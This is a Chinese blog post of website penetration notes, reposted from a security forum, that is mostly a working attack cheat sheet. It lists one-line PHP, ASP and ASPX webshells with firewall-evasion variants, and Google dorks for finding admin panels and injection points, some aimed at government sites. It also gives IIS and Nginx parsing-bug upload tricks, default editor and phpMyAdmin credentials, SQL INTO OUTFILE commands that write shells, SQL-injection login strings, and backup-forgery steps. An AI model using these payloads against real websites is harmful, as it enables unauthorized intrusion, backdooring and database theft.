
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="craymc">
    <title>渗透笔记 - craymc</title>
    <meta name="author" content="craymc">
    
        <link rel="icon" href="/assets/images/bi_favicon .ico">
    
    
        <link rel="alternative" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta name="description" content="渗透笔记本文摘录了常用的网站渗透的内容，转自春秋社区。
【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：D">
<meta property="og:type" content="blog">
<meta property="og:title" content="渗透笔记">
<meta property="og:url" content="http://www.craymc.com/2015/12/23/渗透笔记/index.html">
<meta property="og:site_name" content="craymc">
<meta property="og:description" content="渗透笔记本文摘录了常用的网站渗透的内容，转自春秋社区。
【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：D">
<meta property="og:updated_time" content="2016-07-20T10:47:18.977Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透笔记">
<meta name="twitter:description" content="渗透笔记本文摘录了常用的网站渗透的内容，转自春秋社区。
【 常见网站程序 】—————————————————————————————–asp类：foosun(风讯)kesion(科汛)newasp(新云)乔客CreateLive(创力)5uCMSKingCMSDvBBS(动网)BBSxp[博客]zblog[博客]pjblog—————————————————————————————–PHP类：D">
    
    
    
        <meta property="og:image" content="/assets/images/avatar.png"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style.min.css">
    <!--STYLES END-->
    
</head>

    <body>
        <div id="blog">
            <header id="header" data-behavior="4">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <h1 class="header-title">
        <a class="header-title-link" href="/ ">craymc</a>
    </h1>
    
        
            <a  class="header-right-icon st-search-show-outputs"
                href="#search">
        
                <i class="fa fa-lg fa-bi_favicon .ico"></i>
            </a>
    
</header>
            <nav id="sidebar" data-behavior="4">
    
        <div class="sidebar-profile">
            <a href="/#about">
                
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.png"/>
                
            </a>
            <span class="sidebar-profile-name">craymc</span>
        </div>
    
    
        <ul class="sidebar-buttons">
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/ "
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-home"></i>
                    <span class="sidebar-button-desc">主页</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/all-tags"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
                    <span class="sidebar-button-desc">标签</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/all-archives"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
                    <span class="sidebar-button-desc">归档</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/about"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-question"></i>
                    <span class="sidebar-button-desc">关于</span>
                </a>
        </li>
        
    </ul>
    
        <ul class="sidebar-buttons">
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link " href="https://github.com/" target="_blank">
                
                    <i class="sidebar-button-icon fa fa-lg fa-github"></i>
                    <span class="sidebar-button-desc">GitHub</span>
                </a>
        </li>
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link " href="http://weibo.com" target="_blank">
                
                    <i class="sidebar-button-icon fa fa-lg fa-weibo"></i>
                    <span class="sidebar-button-desc">微博</span>
                </a>
        </li>
        
    </ul>
    
        <ul class="sidebar-buttons">
        
            <li class="sidebar-button">
                
                    <a  class="sidebar-button-link "
                         href="/atom.xml"
                        
                    >
                
                    <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
                    <span class="sidebar-button-desc">RSS</span>
                </a>
        </li>
        
    </ul>
    
</nav>

            
            <div id="main" data-behavior="4"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post" itemscope itemType="http://schema.org/BlogPosting">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title" itemprop="headline">
            渗透笔记
        </h1>
    
    <div class="post-meta">
    <time itemprop="datePublished" content="Wed Dec 23 2015 17:47:33 GMT+0800">
	
		    12月23日, 2015年
    	
    </time>
    
</div>
</div>
    
    <div class="post-content markdown" itemprop="articleBody">
        <div class="main-content-wrap">
            <p>渗透笔记<br>本文摘录了常用的网站渗透的内容，转自春秋社区。</p>
<p>【 常见网站程序 】<br>—————————————————————————————–<br>asp类：<br>foosun(风讯)<br>kesion(科汛)newasp(新云)<br>乔客CreateLive(创力)<br>5uCMSKingCMS<br>DvBBS(动网)<br>BBSxp[博客]zblog<br>[博客]pjblog<br>—————————————————————————————–<br>PHP类：<br>DeDeCms（织梦）<br>ECMS（帝国）<br>PHPCMS<br>PHP168<br>HBcms（宏博）SupeSite<br>CMSware(思维)Joomla!<br>[BBS]Discuz!<br>[BBS]phpWind[SNS]UCenterHome<br>[SNS]ThinkSNS[商城]EcShop<br>[商城]ShopEx[博客]WordPress<br>[维基]HDWiki<br>[微博]PHPsay[DIGG]PBdigg<br>—————————————————————————————–<br><a id="more"></a><br>php开源mysql绝对路径<br>开源系统 数据库配置文件名 文件名所在的目录<br>Discuz! config.inc.php ./ config.inc.php<br>Phpcms config.inc.php ./include/config.inc.php<br>Wodpress wp-config.php ./ wp-config.php<br>Phpwind sqlconfig.php ./data/sqlconfig.php<br>phpweb config.inc.php ./config.inc.php<br>Php168v6 mysql_config.php ./php168/ mysql_config.php<br>Shopex config.php ./config/config.php<br>Ecshop config.php ./data/config.php<br>Joomla configuration.php ./ configuration.php<br>UCenter config.inc.php ./data/config.inc.php<br>EmpireCMS config.php ./e/class/config.php<br>Dedecms common.inc.php .data/common.inc.php<br>Zen Cart configure.php ./includes/configure.php<br>Mediawiki localsettints.php ./config/localsettints.php<br>Ecshop config.php ./data/config.php<br>osCommerce configure.php ./includes/configure.php<br>—————————————————————————————–<br>【 谷歌语法 】<br>site：可以限制你搜索范围的域名.<br>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.<br>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)<br>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码<br>filetype：搜索文件的后缀或者扩展名<br>intitle：限制你搜索的网页标题.<br>link: 可以得到一个所有包含了某个指定URL的页面列表.<br>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username<br>查找可注入点：site:域名 inurl:aspx|jsp|php|asp<br>查找上传漏洞：site:域名 inurl:file|load|editor|Files<br>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit<br>存在的数据库：site:域名 filetype:mdb|asp|#<br>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp<br>迂回策略入侵：inurl:cms/data/templates/images/index/</body></p>
<h1 id="网络设备关键词：intext-WEB-Management-Interface-for-H3C-SecPath-Series"><a href="#网络设备关键词：intext-WEB-Management-Interface-for-H3C-SecPath-Series" class="headerlink" title="网络设备关键词：intext:WEB Management Interface for H3C SecPath Series"></a>网络设备关键词：intext:WEB Management Interface for H3C SecPath Series</h1><p>【 一句话木马 】<br>asp一句话木马：&lt;%eval request(“x”)%&gt;<br>php一句话木马：&lt;?php eval($_POST[g]);?&gt;<br>aspx一句话：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“x”],”unsafe”);%&gt;<br>网站配置、版权信息专用一句话：”%&gt;&lt;%Eval Request(x)%&gt;<br>一句话再过护卫神：&lt;%Y=request(“x”)%&gt; &lt;%execute(Y)%&gt;<br>过拦截一句话木马：&lt;% eXEcGlOBaL ReQuEsT(“x”) %&gt;<br>asp闭合型一句话 %&gt;&lt;%eval request(“0o1Znz1ow”)%&gt;&lt;%<br>能过安全狗的解析格式：;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg<br>突破安全狗的一句话：&lt;%Y=request(“x”)%&gt; &lt;%eval(Y)%&gt;<br>elong过安全狗的php一句话：&lt;?php $a = “a”.”s”.”s”.”e”.”r”.”t”; $a($_POST[cc]); ?&gt;<br>后台常用写入php一句话（密码x）：<br>&lt;?<br>$fp = @fopen(“c.php”, ‘a’);<br>@fwrite($fp, ‘&lt;‘.’?php’.”\r\n\r\n”.’eval($_POST[x])’.”\r\n\r\n?”.”&gt;\r\n”);<br>@fclose($fp);<br>?&gt;<br>高强度php一句话：<br>&lt;?php substr(md5($_REQUEST[‘heroes’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt;<br>新型变异PHP一句话(密码b4dboy):<br>($b4dboy = $_POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);<br>突破安全狗的aspx一句话：<br>&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;<br>&lt;%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[“你的密码”].Value))).CreateInstance(“c”, true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%&gt;<br>突破护卫神，保护盾一句话：<br>&lt;?php $a = str_replace(x,””,”axsxxsxexrxxt”);<br>$a($_POST[“test”]); ?&gt;<br>许多网页程序都不允许包含〈%%〉标记符号的内容的文件上传，这样一句话木马就写入不进数据库了。<br>改成：〈scriptlanguage=VBScript runat=server〉execute request(“l”)〈/Script〉<br>这样就避开了使用〈%%〉，保存为.ASP,程序照样执行的效果是一样的。<br>PHP高强度一句话：<br>&lt;?php substr(md5($_REQUEST[‘x’]),28)==’acd0’&amp;&amp;eval($_REQUEST[‘c’]);?&gt; 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c</p>
<h1 id="lt-php-assert-REQUEST-“c”-gt-菜刀连接-躲避检测-密码：c"><a href="#lt-php-assert-REQUEST-“c”-gt-菜刀连接-躲避检测-密码：c" class="headerlink" title="&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c"></a>&lt;?php assert($_REQUEST[“c”]);?&gt; 菜刀连接 躲避检测 密码：c</h1><p>【 解析漏洞总结 】<br>IIS 6.0<br>目录解析：/xx.asp/xx.jpg xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码<br>IIS6.0 会将 xx.jpg 解析为 asp 文件。<br>后缀解析：/xx.asp;.jpg /xx.asp:.jpg(此处需抓包修改文件名)<br>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。<br>默认解析：/xx.asa /xx.cer /xx.cdx<br>IIS6.0 默认的可执行文件除了 asp 还包含这三种<br>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg<br>IIS 7.0/ IIS 7.5/ Nginx &lt;8.03<br>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。<br>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾<br>e.g.<br>copy xx.jpg/b + yy.txt/a xy.jpg<br>/b 即二进制[binary]模式<br>/a 即ascii模式 xx.jpg正常图片文件<br>yy.txt 内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;<br>意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件<br>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
<h1 id="然后就在图片目录下生成一句话木马-shell-php-密码-cmd"><a href="#然后就在图片目录下生成一句话木马-shell-php-密码-cmd" class="headerlink" title=".然后就在图片目录下生成一句话木马 shell.php 密码 cmd"></a>.然后就在图片目录下生成一句话木马 shell.php 密码 cmd</h1><p>【 ewebeditor编辑器 】<br>默认后台：ewebeditor/admin_login.asp<br>帐号密码：admin admin<br>样式设计：ewebeditor/admin_style.asp<br>查看版本：ewebeditor/dialog/about.html<br>数据库路径：db/ewebeditor.mdb db/%23ewebeditor.mdb db/%23ewebeditor.asp ewebeditor/db/!@#ewebeditor.asp (用谷歌语法找文件名)<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =../..<br>跳转目录：ewebeditor/admin_uoloadfile.asp？id=14&amp;dir=.. (dir为列目录, ..为返回上层目录)，形式:dir ../..<br>点上传文件管理-随便选择一个样式目录，得到：ewindoweditor/admin_uoloadfile.asp?id=14 在id=14后面加&amp;dir=../../../.. 就可看到整个网站的文件了(../自己加减)<br>( ewebeditor5.5版本 )<br>默认后台：ewebeditor/admin/login.asp<br>帐号密码：admin 198625<br>数据库路径：data/%23sze7xiaohu.mdb<br>遍历目录：ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir=../<br>调用样式上传页面：ewebeditor/ewebeditor.htm?id=body&amp;style=popup<br>( ewebeditor3.8 php版本 )<br>默认后台：eWebEditor/admin/login.php<br>首先随便输入一个帐号和密码，接着系统会提示出错，这时清空浏览器的url，然后输入以下代码后连按三次回车键：<br>javascript:alert(document.cookie=”adminuser=”+escape(”admin”));javascript:alert(document.cookie=”adminpass=”+escape(”admin”));javascript:alert(document.cookie=”admindj=”+escape(”1”));<br>接着访问文件：ewebeditor/admin/default.php 就可以直接进入后台了。<br>( ewebeditor编辑器exp手册 )<br>有时候什么后缀都上传了，还是不行。就增加一个asp:jpg格式 上传asp:jpg 试试<br>一：文件上传成功了，但是访问不成功，说明该目录(比如：/UploadFile)被设置了权限，返回去换成/ 上传到根目录就行了.增加asp等不行的时候，可以利用解析asp;jpg<br>二：下载数据库查看前人留下的痕迹，再访问上传页面拿shell。</p>
<h1 id="页面路径：-ewebeditor-asp-id-48-amp-style-popu7-用工具浏览数据库找到已添加asp-asa-cer-php的栏目，把S-ID跟S-Name的值替换在语句里访问，上传相对应的格式木马。"><a href="#页面路径：-ewebeditor-asp-id-48-amp-style-popu7-用工具浏览数据库找到已添加asp-asa-cer-php的栏目，把S-ID跟S-Name的值替换在语句里访问，上传相对应的格式木马。" class="headerlink" title="页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。"></a>页面路径：/ewebeditor.asp?id=48&amp;style=popu7 用工具浏览数据库找到已添加asp|asa|cer|php的栏目，把S_ID跟S_Name的值替换在语句里访问，上传相对应的格式木马。</h1><p>【 fckeditor编辑器 】<br>查看版本：fckeditor/editor/dialog/fck_about.html<br>编辑器页面：FCKeditor/_samples/default.html<br>上传页面：fckeditor/editor/filemanager/connectors/test.html<br>遍历目录：FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/<br>编辑页面：fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp<br>查看文件上传路径：fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=<br>( 拿shell方法总结 )<br>ASPX的站几乎都用fck编辑器，建议用工具扫一下，记住inc目录下可能存在fck编辑器，扫下这个目录。<br>一：如果是iis6.0，上传两次 1.asp;.jpg 或者1.asp;1.jpg 或者创建x.asp目录，再在这个目录下上传x.jpg 或者直接上传1.asp;jpg 都可以完美解析拿下shell<br>二：第一次上传1.asp;1.jpg，被重命名为：1_asp;1.jpg，但是第二次上传1.asp;1.jpg，就有可能变成：1.asp;1(1).jpg<br>三：iis7.5+fck的解析文件为：a.aspx.a;.a.aspx.jpg..jpg.aspx<br>四：如果不是iis6.0 上传1.asp;jpg然后抓包，接下来改包，将分号变成空格，再用c32把20改成00，保存，利用%00 截断分号两次<br>五：成功访问别人的一句话木马页面，<a href="http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg" target="_blank" rel="external">http://xx.com/UploadFiles\EditorFile\file/2.asp;2(1).jpg</a> 但不知道密码<br><a href="http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg" target="_blank" rel="external">http://xx.com/UploadFiles\EditorFile\file\2_asp;2.jpg</a> 这个是图片木马，没有成功利用iis6.0解析漏洞还是图片，下载下来用记事本打开找到密码。<br>六：IIS7.0/7.5 通杀oday，把php一句话木马后缀改成1.jpg传上去，找出一句话的路径后，在1.jpg的后面添加/.php 例如：/.php<br>( 建立文件夹 . 变 _ 的突破方法 )<br>利用Fiddler web debugger 这款工具来进行修改数据包，从而达到突破的目的。<br>注意：安装Fiddler web debugger，需要安装.net环境以及.net的SP2补丁方可运行！<br>1.打开fck的上传页面，例如：fckeditor/editor/filemanager/browser/default/connectors/test.html<br>2.再打开Fiddler web debugger这款工具，点击设置–自动断点–选择 “请求之前”<br>3.接着打开fck的上传页面，创建文件夹，并输入你想要创建的文件名，例如：x.asp<br>4.然后返回到Fiddler web debugger这款工具里，选择链接–点击右侧的嗅探<br>5.修改currentfolder内的参数，改成你要建立的文件夹名字，如：x.asp<br>6.然后点击右侧的：run to completion</p>
<h1 id="7-再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x-asp了"><a href="#7-再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x-asp了" class="headerlink" title="7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了"></a>7.再点击软件设置–自动断点–禁用，再到浏览器里点击确定建立文件夹，你就会发现文件夹建立为x.asp了</h1><p>【 linux 】<br>解析格式：1.php.xxx (xxx可以是任意)<br>如果apache不认识后缀为rar的文件，我们就用1.php.rar格式上传，文件就会被服务器当做PHP脚本解析。</p>
<h1 id="辨别linux系统方法，例如：http-www-xxx-com-xxx-abc-asp-id-125-把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统"><a href="#辨别linux系统方法，例如：http-www-xxx-com-xxx-abc-asp-id-125-把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统" class="headerlink" title="辨别linux系统方法，例如：http://www.xxx.com/xxx/abc.asp?id=125 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统."></a>辨别linux系统方法，例如：<a href="http://www.xxx.com/xxx/abc.asp?id=125" target="_blank" rel="external">http://www.xxx.com/xxx/abc.asp?id=125</a> 把b换成大写B访问，如果出错了，就说明是linux系统，反之是windows系统.</h1><p>【 旁注 】<br>旁注的技巧就是挑选支持aspx的站来日，这样提权时候希望较大，如何探测服务器上哪些站点支持aspx呢? 利用bing搜索：<a href="http://cn.bing.com/" target="_blank" rel="external">http://cn.bing.com/</a> 搜索格式：ip:服务器ip aspx</p>
<h1 id="比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx-aspx回车，如果显示的不是iis默认的错误页面，而是这种：“-”应用程序中的服务器错误，说明支持aspx马。"><a href="#比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx-aspx回车，如果显示的不是iis默认的错误页面，而是这种：“-”应用程序中的服务器错误，说明支持aspx马。" class="headerlink" title="比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。"></a>比如要入侵一个网站，想知道该网站支不支持aspx，就在网站后面随便加上一个xxx.aspx回车，如果显示的不是iis默认的错误页面，而是这种：“/”应用程序中的服务器错误，说明支持aspx马。</h1><p>【 phpmyadmin 】<br>查看版本：test.php 或 phpinfo.php<br>默认账号密码：root root<br>万能帐号密码：’localhost’@’@” 密码空<br>拿shell第一种方法：<br>CREATE TABLE mysql.darkmoon (darkmoon1 TEXT NOT NULL );<br>INSERT INTO mysql.darkmoon (darkmoon1 ) VALUES (‘&lt;?php @eval($_POST[pass]);?&gt;’);<br>SELECT darkmoon1 FROM darkmoon INTO OUTFILE ‘d:/wamp/www/darkmoon.php’;<br>DROP TABLE IF EXISTS darkmoon;<br>拿shell第二种方法：<br>Create TABLE moon (darkmoon text NOT NULL);<br>Insert INTO moon (darkmoon) VALUES(‘&lt;?php @eval($_POST[pass]);?&gt;’);<br>select darkmoon from moon into outfile ‘d:/wamp/www/darkmoon2.php’;<br>Drop TABLE IF EXISTS moon;<br>拿shell第三种方法：<br>select ‘&lt;?php @eval($_POST[pass]);?&gt;’INTO OUTFILE ‘d:/wamp/www/darkmoon3.php’<br>拿shell第四种方法<br>select ‘&lt;?php echo \’<pre>\’;system($_GET[\’cmd\’]); echo \’</pre>\’; ?&gt;’ INTO OUTFILE ‘d:/wamp/www/darkmoon4.php’<br>127.0.0.1/darkmoon4.php?cmd=net user<br>找到mysql数据库，执行sql语句即可写入一句话，再菜刀连接即可。<br>phpmyadmin脱裤：在这里面是可以直接拖库的，如同上传php拖库脚本一样，操作差不多的。<br>修改mysql默认的root用户名方法:<br>进入phpmyadmin,进入mysql表,执行sql语句<br>1.update user set user=’你的新root用户名’ where user=’root’;<br>2.flush privileges;<br>例如：<br>用root身份登入，进入mysql库，修改user表即可。<br>1.use mysql;<br>2.mysql&gt;update user set user=’newName’ where user=’root’;</p>
<h1 id="3-mysql-gt-flush-privileges"><a href="#3-mysql-gt-flush-privileges" class="headerlink" title="3.mysql&gt; flush privileges;"></a>3.mysql&gt; flush privileges;</h1><p>【 万能密码 】<br>( php )<br>帐号：’ UNION Select 1,1,1 FROM admin Where ”=’<br>密码：1<br>( asp )<br>‘xor<br>‘or’=’or’<br>‘or”=”or”=’<br>‘or ‘1’=’1’or ‘1’=’1</p>
<h1 id="‘or-1-1"><a href="#‘or-1-1" class="headerlink" title="‘or 1=1/*"></a>‘or 1=1/*</h1><p>【 批量关键词 】<br>inurl:asp?id=<br>inurl:detail.php?<br>CompHonorBig.asp?id= 很不错的的一个搜索注入点<br>inurl:show.asp? 非常强大<br>site:www.yuming.com<br>inurl:articleshow.asp?articleid=数字<br>inurl:szwyadmin/login.asp<br>inurl:asp?id=1 intitle:政府</p>
<h1 id="杭州-inurl-Article-Class2-asp"><a href="#杭州-inurl-Article-Class2-asp" class="headerlink" title="杭州 inurl:Article_Class2.asp?"></a>杭州 inurl:Article_Class2.asp?</h1><p>【 木马后门 】<br>1.TNTHK小组内部版 —— 存在关键词后门，随便输入一个错的密码，右键查看源文件，找到错误关键词后面的font，在font后面的就是正确密码。<br>2.不灭之魂—不死僵尸变种 —— 用这款工具专门爆这款大马的密码：爆不灭之魂密码</p>
<h1 id="3-终极防删免杀多功能VIP版本-无后门-——-万能密码：wbgz-菜刀连接：kk"><a href="#3-终极防删免杀多功能VIP版本-无后门-——-万能密码：wbgz-菜刀连接：kk" class="headerlink" title="3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk"></a>3.终极防删免杀多功能VIP版本-无后门 —— 万能密码：wbgz 菜刀连接：kk</h1><p>【 安全狗 】<br>1.过注入<br>方法一：a.asp?aaa=%00&amp;id=sql语句<br>方法二： a.asp?id=sql语句 里面把安全过滤的加个%l 比如： un%aion sel%aect 1,2,3,4 fr%aom admin<br>2.过大马被阻拦访问<br>方法一：上传一个大马 然后访问<a href="http://sss.com/dama.asp" target="_blank" rel="external">http://sss.com/dama.asp</a> ; 访问后出现拦截。<br>那么解决方法 先将dama.asp改名dama.jpg上传，然后在同目录上传个文件da.asp 内容为： &lt;!–#include file=”dama.jpg” –&gt; 这样再访问da.asp 就不会被拦截了。<br>3.过菜刀连接一句话被拦截<br>方法一：不用菜刀连接一句话，用别的一句话连接端。</p>
<h1 id="方法二：中转下连接菜刀，把过滤掉的词替换掉。"><a href="#方法二：中转下连接菜刀，把过滤掉的词替换掉。" class="headerlink" title="方法二：中转下连接菜刀，把过滤掉的词替换掉。"></a>方法二：中转下连接菜刀，把过滤掉的词替换掉。</h1><p>【 本地构造上传漏洞 】<br>寻找程序上传漏洞，必须从上传页面的源文件入手，目标有两个：<br>1.filename (文件名称) 在上传页面中针对文件扩展名过滤不严，从而上传可执行的脚本木马。<br>2.filepath (文件路径) 在上传页面针对路径过滤不严，导致可以修改上传相对路径上传脚本木马。<br>当检测到一个上传页面，asp、asa后缀已经被过滤掉的时候，可以尝试抓包明小子或NC上传！<br>不行就利用本地上传漏洞构造上传！例如上传页面是：<a href="http://www.xx.com/upfile_other.asp" target="_blank" rel="external">http://www.xx.com/upfile_other.asp</a><br>1.右键查看源文件，找到这段代码：<form name="”form1″" method="”past”" action="”zwhua_upload1.asp”" enctype="”multipart/form-data”"><br>把以上代码中actino处的路径补全！即：<form name="”form1″" method="”past”" action="”http://www.xxx.com/zwhua_upload1.asp”" enctype="”multipart/form-data”"><br>2.再找到这段代码：<input type="”hidden”" name="”filepath”" value="”uploadfile/”"><br>利用IIS6.0解析漏洞，把以上代码中value处的文件补全！即：<input type="”hidden”" name="”filepath”" value="”uploadfile/1.asa;" “=""> 注意：冒号后面有空格！<br>3.接着保存为1.html，将刚保存的文件拖进去C32里，选择十六进制模式，找到“1.asa; ”后面的空格，将其填充为00后保存退出！</form></form></p>
<h1 id="4-本地打开上传图片格式的木马-不成功时可以尝试上传一句话木马-，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！"><a href="#4-本地打开上传图片格式的木马-不成功时可以尝试上传一句话木马-，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！" class="headerlink" title="4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！"></a>4.本地打开上传图片格式的木马(不成功时可以尝试上传一句话木马) ，如果提示成功后不显示路径的话，可以右键查看源文件自己手工找出路径访问即可！</h1><p>【 利用双文件上传拿shell 】<br>因为网站只判断一次，如果第一个文件后缀是在白名单里面的话，就让其上传，并没有判断第二个文件，所以上传任意格式的文件也让其通过。<br>当系统验证cookie的时候，就要用到火狐浏览器了，登录网站进后台，让火狐浏览器保存管理员的cookie值，再把修改后的“双文件上传工具”拖进去上传。<br>1.在后台找上传点，右键查看源文件，找到上传地址，一般在post或action的附近，搜索即可找到，一般为：src=”../xxx.htm” 之后补全路径访问。<br>2.这个还不是真正的上传页面，真正的上传页面后缀是asp的，继续查看源代码，找到action=”xxx.asp”，补全路径访问即可！<br>4.其实也可以抓包从而获得上传路径，抓包之后，在Referer:这栏，还有常见的是：htto://www.xxxx.com/upfile_other.asp</p>
<h1 id="3-打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。"><a href="#3-打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。" class="headerlink" title="3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。"></a>3.打开双文件上传工具，替换为当前的上传地址，保存后拖进火狐浏览器里，第一个选择jpg木马，第二个选择cer木马，提交后右键查看源文件找出路径即可。</h1><p>【 数据库备份抓包改包NC提交拿shell 】<br>当备份路径不能修改,后缀又是mdb不变的时候，我们可先对备份的过程进行抓包，再本地构造用NC提交即可突破备份，数据库恢复也可使用此方法！<br>在抓包的时候，最好用火狐浏览器，因为有的浏览器抓不到包，首先上传一张图片木马复制下地址，接着对备份过程进行抓包！把抓到的数据复制在文本里面！<br>开始本地修改，先把POST处补全网址，找到最底下的一行数据，再复制多一行对比长度进行修改，把备份的数据名称替换为木马地址，备份的名称改为自己想要的asp后缀！</p>
<h1 id="再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length-处进行增减，用NC提交数据格式：nc-域名-80-lt-1-txt"><a href="#再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length-处进行增减，用NC提交数据格式：nc-域名-80-lt-1-txt" class="headerlink" title="再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt"></a>再将原来的数据长度跟现在的对比同时替换掉，最后看一共增加了多少个字符，就在Content-Length:处进行增减，用NC提交数据格式：nc 域名 80&lt;1.txt</h1><p>【 本地构造数据库备份突破拿shell 】<br>当上传jpg木马得到路径前去备份时，发现数据库备功能用不了的情况下，可以尝试本地构造突破拿shell！<br>首先查看源文件，找到“当前数据库路径”修改为刚上传jpg木马的路径，再找到“数据库备份名称”修改为1.asa<br>找到“<form method="”past”" action="”Backup.asp?action=Backup”">” 将路径补全“<form method="”past”" action="”http://xxx.com/admin/Backup.asp?action=Backup”">”<br>最后保存为1.html，有的网站不验证cookie的话，直接打开进行备份就能成功了，但是一般都需要验证cookie，这时就用上火狐浏览器了。</form></form></p>
